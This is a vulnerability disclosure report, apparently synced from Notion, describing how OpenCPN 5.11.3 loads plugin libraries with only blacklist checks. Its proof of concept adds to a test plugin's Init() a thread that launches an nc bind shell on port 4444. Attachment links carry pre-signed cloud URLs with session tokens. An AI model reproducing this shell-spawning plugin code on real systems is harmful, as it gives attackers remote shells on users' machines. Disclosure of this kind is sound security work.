---
notion_url: https://www.notion.so/76ebe08098308313956a81d9af926c10
last_synced: 2026-06-12 18:07
tags: [notion-sync]
---

# Code Injection

- 📄 [[KOR OpenCPN RCE - Code Injection/KOR OpenCPN RCE - Code Injection|KOR OpenCPN RCE - Code Injection]]

Vulnerability Title : OpenCPN RCE - Code Injection
Vulnerability Summary : Remote Code Execution arising from loading dynamically linked library files without signature, path, or whitelist validation
Vendor : GitHub OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Code Injection
Impact : Remote Code Execution with process privileges
Vulnerable Source File: `plugin_loader.cpp
`
Vulnerable Function: `PluginLoader::LoadPlugIn()`
Vulnerable Parameters : 

```c++
const wxString& plugin_file, PlugInContainer* pic
```

Affected Environment : Ubuntu 24.04

Proof Of Concept  : 
During the library load process, only blacklist-based validation is performed:

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

Using the OpenCPN TestPlugin template from GitHub for an example RCE via a bind shell:
https://github.com/jongough/testplugin_pi.git

Add the following at the very top of `src/testplugin_pi.cpp`’s `Init()`:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

After building and importing this plugin into OpenCPN:

![image](_assets/image.png)


You can connect to the shell via `nc`, demonstrating Remote Code Execution.

Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QJ5UFW3Q%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T090730Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEgaCXVzLXdlc3QtMiJHMEUCIHCyJh2883LrUAv1TKubxfx7Ez%2Bji10uuImoJlFk5b49AiEAmjO5ICbtqp3e7GW%2BEA9%2BA6MUbPQhQu0werUevilgKzMq%2FwMIERAAGgw2Mzc0MjMxODM4MDUiDHVgoxBiAHeBdvMOESrcAy9UsYRcKqbKsYe0KgrjWEwOFeC4sIi81PmbPZ3Q%2BibSL9n9VWzlDlIbpr6MzbEvHM9wC2h8A6IUfK9oHSGSmKRvQRecex8256AkhsN3YK%2F63KnNujP%2FnsM6B%2BJX9Kxfk37oNsGj44a1iU1GdnczB0ZdCD9YcdXLUbnYjOiozs0gKVpRFi9Cx%2F2I1UppBfM%2FziilUql8j7VuTKjQH43HyxZlcMwWfXVU6TpfgY0WqJKC1CNXRXDNi82GBcZdYybffx6qRwzMUilHDka7lNTv28WGani8RHHQz6shpJJJtZHJvxDQM0qPukKJubH3fMvuG6%2Fs9Fs9cWfK9rtOeBFH1iKsCkiwy%2FAyC5g7Wn4XLTKvih4nFKLzJZpD%2BTzEL2qdTjDQtqeEJ5y5F7MTYFWdmuR5HvtLQf9dC9ihg32EDE%2B3yNg1H4nafRFeXxUHQJ0HwysPJHoZVKH%2BsNoyp6D60UuInDZKy10keufARRObnfIg484SE3laZ9NlWzNKCAVMn2wvi9KF2IsIT2jhC%2B4UwL9HmnkROaK%2Fcjv%2FS1xFCCOH1Dsd5Hj%2Fy4aFbAzo0JUKxRGhZYVSfv%2BF2%2BGoePF24PahSd2ePZXDLaX%2BCEYnehRQaaA5Zxtyo6hfw0%2F4MNbyrtEGOqUBbHJgcxtH33J04Gq9E9Nnthyd3itx%2FW1Z3JxieIV1gDaZVSSnc1cobU4PTHn6orgTGgFebdT201v%2BHuG1TcShBxy3MPJy9OvtyBEXiuBhBh9Z9B0rZaGXqI6naVrLJfOgRUUJsZwBMZ%2B%2BXueCT7TlIzBiyNXKlr1gICE9YrqiAgyy6%2Fj8oanQkprwlEHtm4Aq1oBi6LrK%2B1TCaIftCtbCef9xs6Mp&X-Amz-Signature=9c487ea484d37c2255a92dfe5923004e6c478dbc0f0a8c7698dcd0487e4da96a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/6af31ca2-0d32-4cb4-8668-82a7bd93bf73/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QJ5UFW3Q%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T090730Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEgaCXVzLXdlc3QtMiJHMEUCIHCyJh2883LrUAv1TKubxfx7Ez%2Bji10uuImoJlFk5b49AiEAmjO5ICbtqp3e7GW%2BEA9%2BA6MUbPQhQu0werUevilgKzMq%2FwMIERAAGgw2Mzc0MjMxODM4MDUiDHVgoxBiAHeBdvMOESrcAy9UsYRcKqbKsYe0KgrjWEwOFeC4sIi81PmbPZ3Q%2BibSL9n9VWzlDlIbpr6MzbEvHM9wC2h8A6IUfK9oHSGSmKRvQRecex8256AkhsN3YK%2F63KnNujP%2FnsM6B%2BJX9Kxfk37oNsGj44a1iU1GdnczB0ZdCD9YcdXLUbnYjOiozs0gKVpRFi9Cx%2F2I1UppBfM%2FziilUql8j7VuTKjQH43HyxZlcMwWfXVU6TpfgY0WqJKC1CNXRXDNi82GBcZdYybffx6qRwzMUilHDka7lNTv28WGani8RHHQz6shpJJJtZHJvxDQM0qPukKJubH3fMvuG6%2Fs9Fs9cWfK9rtOeBFH1iKsCkiwy%2FAyC5g7Wn4XLTKvih4nFKLzJZpD%2BTzEL2qdTjDQtqeEJ5y5F7MTYFWdmuR5HvtLQf9dC9ihg32EDE%2B3yNg1H4nafRFeXxUHQJ0HwysPJHoZVKH%2BsNoyp6D60UuInDZKy10keufARRObnfIg484SE3laZ9NlWzNKCAVMn2wvi9KF2IsIT2jhC%2B4UwL9HmnkROaK%2Fcjv%2FS1xFCCOH1Dsd5Hj%2Fy4aFbAzo0JUKxRGhZYVSfv%2BF2%2BGoePF24PahSd2ePZXDLaX%2BCEYnehRQaaA5Zxtyo6hfw0%2F4MNbyrtEGOqUBbHJgcxtH33J04Gq9E9Nnthyd3itx%2FW1Z3JxieIV1gDaZVSSnc1cobU4PTHn6orgTGgFebdT201v%2BHuG1TcShBxy3MPJy9OvtyBEXiuBhBh9Z9B0rZaGXqI6naVrLJfOgRUUJsZwBMZ%2B%2BXueCT7TlIzBiyNXKlr1gICE9YrqiAgyy6%2Fj8oanQkprwlEHtm4Aq1oBi6LrK%2B1TCaIftCtbCef9xs6Mp&X-Amz-Signature=e457fc33694c57ad56e3f6afd4fd4ca0be0c386aa20e0623adf26b9760e296ba&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
